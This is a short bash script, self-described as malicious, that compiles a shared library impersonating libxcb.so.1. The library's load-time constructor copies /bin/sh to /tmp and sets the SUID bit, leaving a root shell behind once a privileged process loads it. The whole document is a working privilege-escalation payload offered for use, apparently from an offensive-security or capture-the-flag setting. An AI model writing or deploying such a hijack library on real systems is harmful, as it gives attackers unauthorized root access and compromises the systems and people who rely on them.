#!/bin/bash
#Compiles a malicious shared library that automatically creates a SUID root shell when loaded by a privileged process.

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
    exit(0);
}
EOF

echo "[+] Malicious libxcb.so.1 created."
